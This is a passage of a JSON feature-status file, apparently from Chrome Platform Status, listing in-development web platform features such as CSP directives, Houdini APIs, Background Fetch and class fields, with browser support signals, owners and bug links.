      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "To support sharing of MHTML pages, a new header Snapshot-Content-Location will be added. The existing Subject header will be updated to support encoding of non-printable ASCII characters.",
    "id": 5745939008454656,
    "resources": {
      "docs": [
        "https://discourse.wicg.io/t/mhtml-generation-and-loading-as-implemented-in-chrome/2387"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-09-17 08:29:02.241210",
      "by": "Patket@microsoft.com"
    },
    "name": "Add purpose member to the Web App Manifest",
    "tags": [
      "web",
      "manifest",
      "purpose"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://www.w3.org/TR/appmanifest/#purpose-member",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "pkotwicz@chromium.org",
          "peter@chromium.org",
          "zpeng@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "http://crbug.com/649771",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Chrome will use the purpose member in the Web App Manifest to determine which icon to use in the status bar for notifications for \"Improved Add to Homescreen\" web apps (described https://www.youtube.com/watch?v=YJwrBbze_Ec)\r\n\r\nThis is already possible for Android M+ using notification badges described in https://www.chromestatus.com/features/5630897160192000\r\nUsing the \"purpose\" member will enable doing this for pre-M Android",
    "id": 6690807302062080,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2018-05-12 04:48:11.079030",
      "by": "domfarolino@gmail.com"
    },
    "name": "Add referrerpolicy support to <script> elements",
    "tags": [
      "referrer",
      "referrerpolicy",
      "referrer policy",
      "referer",
      "privacy"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://github.com/whatwg/html/pull/3678",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1460920",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "domfarolino@gmail.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>HTML>Script"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=841673",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/17480490/",
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=185550",
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Many resource-fetching elements have support for the `referrerpolicy` attribute, which lets developers provide a keyword to influence the value of the `Referer` HTTP header that accompanies a request. The <link> element has support for this, so it is possible to fetch a script with a developer-set referrer policy with <link rel=preload as=script referrerpolicy=... href=...>. The script element currently does not have support for the referrerpolicy attribute, and this feature adds support for it.",
    "id": 5227651627220992,
    "resources": {
      "docs": [
        "https://github.com/w3c/webappsec-referrer-policy/issues/96"
      ],
      "samples": [
        "https://script-referrerpolicy.glitch.me/"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2018-03-06 18:44:13.789710",
      "by": "rouslan@chromium.org"
    },
    "name": "Allow PaymentRequest.show() to take optional detailsPromise",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://github.com/w3c/payment-request/pull/672/files",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1441709",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "rouslan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Payments"
        ],
        "flag": false,
        "bug": "https://crbug.com/817073",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=182538",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Some users may not know the total or line items at the time of attempting to open the payment sheet with show() -- there may be asynchronous server-based logic yet to be resolved. This feature is a way to signal that the browser should show a spinner or equivalent and wait to allow end user interaction until an update.",
    "id": 6092351889997824,
    "resources": {
      "samples": [
        "https://rsolomakhin.github.io/pr/wait/",
        "https://rsolomakhin.github.io/pr/single-wait/",
        "https://rsolomakhin.github.io/pr/multi-wait/",
        "https://rsolomakhin.github.io/pr/us-wait/",
        "https://rsolomakhin.github.io/pr/ko/reject-show-promise/",
        "https://rsolomakhin.github.io/pr/ko/timeout-show-promise/",
        "https://rsolomakhin.github.io/pr/ko/show-promise-unsupported-method/"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-05-01 01:09:10.319330",
      "by": "xidachen@chromium.org"
    },
    "name": "AnimationEvent.pseudoElement",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://drafts.csswg.org/css-animations/#interface-animationevent",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/API/AnimationEvent/pseudoElement",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "animations-dev@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Animation"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=437132",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "AnimationEvent.pseudoElement is a string that starts with \"::\", containing the name of the pseudo-element the animation runs on. If the animation is running on the element, then it is an empty string.",
    "id": 5112855204462592,
    "resources": {}
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2018-02-13 21:15:58.750710",
      "by": "majidvp@chromium.org"
    },
    "name": "AnimationWorklet",
    "tags": [
      "UIWorker",
      "CompositorWorker"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://wicg.github.io/animation-worklet/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://lists.w3.org/Archives/Public/public-houdini/2015Mar/0020.html",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "flackr@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Animation"
        ],
        "flag": false,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=467782",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://lists.w3.org/Archives/Public/www-style/2014Oct/0201.html",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "AnimationWorklet is a worklet to allow script-driven and stateful animations that run on a dedicated thread",
    "id": 5762982487261184,
    "resources": {
      "docs": [
        "http://dassur.ma/things/animworklet/"
      ],
      "samples": [
        "http://googlechromelabs.github.io/houdini-samples/"
      ]
    }
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-06-14 18:28:32.433250",
      "by": "ericbidelman@google.com"
    },
    "name": "Antialiased Clipping in Canvas",
    "comments": "",
    "standards": {
      "status": {
        "text": "De-facto standard",
        "val": 1
      },
      "footprint": {
        "val": 5
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "robertphillips@chromium.org",
          "junov@chromium.org",
          "senorblanco@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=422984",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "The Canvas spec seems intentionally vague about the antialiasing of clips but:\r\n\r\na) performing antialiased draws but aliased clips seems to defy web developer expectations and\r\nb) most other browsers antialias the canvas clips.",
    "id": 4871530282483712,
    "resources": {}
  },
  {
    "category": "Service Worker",
    "updated": {
      "when": "2018-03-28 20:54:37.782190",
      "by": "ericbidelman@google.com"
    },
    "name": "Background Fetch API",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "peter@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>BackgroundFetch"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=684578",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Background Fetch API provides a service worker based download and upload mechanism which is persistent across service worker and browser restarts.\r\n\r\nThe system will provide a developer-controllable interface to schedule, query, pause, and cancel background downloads and uploads. After a scheduled fetch completes, the system will notify the developer of the outcome of the operation.\r\n\r\nIn progress fetches will be visible to users in a notification.\r\n",
    "id": 5712608971718656,
    "resources": {
      "docs": [
        "https://github.com/jakearchibald/background-fetch",
        "https://docs.google.com/a/chromium.org/document/d/15ujgpnWa3VJaxyFwSBIa-VLFA48lafwH9GkxeBGo5l8/edit?usp=sharing"
      ],
      "samples": [
        "https://github.com/jakearchibald/background-fetch"
      ]
    }
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-07-12 19:55:18.927070",
      "by": "xidachen@chromium.org"
    },
    "name": "Background rendering of SVG images with createImageBitmap",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://html.spec.whatwg.org/#imagebitmapfactories",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "xidachen@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=580202",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "There are no changes to any APIs. This feature is a change in performance characteristics, which may affect how developpers chose to use createImageBitmap.\r\n\r\nThe internal implementation of createImageBitmap will be changed to perform part of the rendering in a background thread. Once createImageBitmap returns a promise, the created ImageBitmap, which is always in a decoded stage, can be used as an image source.\r\n",
    "id": 5714261762375680,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2016/03/createimagebitmap-in-chrome-50",
        "https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/createImageBitmap"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:29:00.499050",
      "by": "ericbidelman@google.com"
    },
    "name": "CORS restrictions on internet-to-intranet connections.",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://mikewest.github.io/cors-rfc1918/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://crbug.com/590714",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "We'll begin requiring servers on a user's machine (127.0.0.1) or intranet (as defined by RFC1918) to explicitly opt-in to connections originating from the public internet. Hopefully, this will mitigate the risks associated with unintentional exposure of devices and servers on a client’s internal network to the web at large.",
    "id": 5733828735795200,
    "resources": {}
  },
  {
    "category": "Security",
    "updated": {
      "when": "2018-04-25 04:56:47.614580",
      "by": "Patket@microsoft.com"
    },
    "name": "CSP 'navigate-to' directive",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/webappsec-csp/#directive-navigate-to",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "andypaicu@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>SecurityFeature"
        ],
        "flag": false,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The navigate-to directive restricts the URLs to which a document can initiate navigations by any means (a, form, window.location, window.open, etc.). This is an enforcement on what navigations this document initiates not on what this document is allowed to navigate to. If the form-action directive is present, the navigate-to directive will not act on navigations that are form submissions.",
    "id": 6457580339593216,
    "resources": {
      "samples": [
        "https://w3c.github.io/webappsec-csp/#directive-navigate-to"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-10-05 10:20:46.810440",
      "by": "andypaicu@chromium.org"
    },
    "name": "CSP3: unsafe-hashed-attributes",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/webappsec-csp/#unsafe-hashed-attributes-usage",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "andypaicu@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>SecurityFeature>ContentSecurityPolicy"
        ],
        "flag": false,
        "bug": "http://crbug.com/771922",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "'unsafe-hashed-attributes' is a feature in CSP3 which allows developers to enable specific event handlers without needing to use the less safe 'unsafe-inline' keyword.\r\nIf 'unsafe-hashed-attributes' is present, inline event handlers are allowed to match against hashes specified by the 'script-src' directive (or its fallback if not present).",
    "id": 5867082285580288,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:53.253710",
      "by": "ericbidelman@google.com"
    },
    "name": "CSP: Hardened `nonce` content attribute.",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://www.w3.org/2011/webappsec/minutes/2017-01-25-webappsec-minutes.html#item03",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>SecurityFeature>ContentSecurityPolicy"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=680419",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "We've seen some recent attacks on CSP which rely on the ability to exfiltrate nonce data via various mechanisms that can grab data from content attributes. CSS selectors are the best example.\r\n\r\nTo mitigate these attacks, we'll hide the attribute from these side-channels, and only expose the value to script.",
    "id": 5685968463986688,
    "resources": {
      "docs": [
        "https://github.com/whatwg/dom/pull/436"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:11.320160",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS Box Alignment",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://dev.w3.org/csswg/css-align/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://platform-status.mozilla.org/#css-box-alignment-block",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "cbiesinger@chromium.org"
        ],
        "prefixed": true,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "http://crbug.com/226252",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/status/boxalignment/",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "CSS properties for aligning boxes within their container. Allows for true vertical centering among other features.",
    "id": 6173208034148352,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-20 18:41:54.684550",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS Box Alignment (for flexbox layout)",
    "tags": [
      "css box alignment flexbox"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://drafts.csswg.org/css-align",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "cbiesinger@chromium.org",
          "jfernandez@igalia.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Layout>Flexbox"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=722287",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Implementation of the new alignment values for the Flexbox layout.",
    "id": 4752192980385792,
    "resources": {
      "docs": [
        "https://drafts.csswg.org/css-align/#propdef-align-content",
        "https://drafts.csswg.org/css-align/#propdef-justify-content",
        "https://drafts.csswg.org/css-align/#align-items-property",
        "https://drafts.csswg.org/css-align/#align-self-property"
      ]
    }
  },
  {
    "category": "Houdini",
    "updated": {
      "when": "2018-03-28 19:29:26.742020",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS Layout API (Houdini)",
    "tags": [
      "CSS",
      "Houdini",
      "Layout"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://drafts.css-houdini.org/css-layout-api/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "ikilpatrick@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Layout"
        ],
        "flag": false,
        "bug": "http://crbug.com/726125",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The CSS Layout API defines a new callback which is designed to allow developers to create additional layouts algorithms in the layout phase of the rendering engine.\r\n",
    "id": 5673954630959104,
    "resources": {}
  },
  {
    "category": "Houdini",
    "updated": {
      "when": "2018-03-28 19:29:50.855150",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS Properties and Values API Level 1 (Houdini)",
    "tags": [
      "houdini",
      "variables"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://drafts.css-houdini.org/css-properties-values-api/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://groups.google.com/d/msg/mozilla.dev.platform/CNmJeMkUv88/oLmZacPECAAJ",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "timloh@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=641877",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The CSS Properties and Values API spec defines an registerProperty() function which can be called from JavaScript to register typed and animatable custom CSS properties. This API expands the existing CSS custom properties to improve usability of other Houdini APIs. Being able to animate these and customise inheritance and initial values makes it more useful for custom layout/paint, and having types associated with these allows the typed OM to work more effectively with custom properties.",
    "id": 5640265926705152,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:28.140910",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS font-stretch",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://dev.w3.org/csswg/css-fonts/#propdef-font-stretch",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/CSS/font-stretch",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "eae@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=331119",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "http://msdn.microsoft.com/en-us/library/ie/jj127324",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Add support the the CSS font-stretch property.",
    "id": 4598830058176512,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/font-stretch"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:29:07.694240",
      "by": "ericbidelman@google.com"
    },
    "name": "Canvas HitRegions",
    "tags": [
      "hit testing",
      "canvas",
      "accessibility"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://html.spec.whatwg.org/multipage/scripting.html#hit-region",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/API/CanvasRenderingContext2D/addHitRegion",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "jinho.bang@samsung.com",
          "junov@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://crbug.com/328961",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Allows the creation of arbitrarily-shaped pointer event targets in <canvas> elements, along with accessibility features such as text meta-data and association with focusable controls.",
    "id": 5904994859483136,
    "resources": {
      "docs": [
        "http://www.w3.org/wiki/Canvas_hit_testing",
        "https://www.w3.org/wiki/HTML/Canvas_Task_Force/CR-Test",
        "https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API/Tutorial/Hit_regions_and_accessibility"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-04-18 15:16:19.727410",
      "by": "jmedley@google.com"
    },
    "name": "Class Fields",
    "tags": [
      "javascript",
      "class fields",
      "class",
      "fields",
      "private",
      "public"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://tc39.github.io/proposal-class-fields/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "In development",
          "val": 3,
          "milestone_str": "In development"
        },
        "owners": [
          "gsathya@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>JavaScript>Language"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=5367",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=174212",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This feature introduces public and private fields to classes in ECMAScript.",
    "id": 6001727933251584,
    "resources": {
      "docs": [
        "http://2ality.com/2017/07/class-fields.html",
        "https://github.com/tc39/proposal-class-fields/blob/master/README.md",
        "https://github.com/tc39/proposal-unified-class-features"
      ]
    }
  },
  {
    "category": "Graphics",
    "updated": {
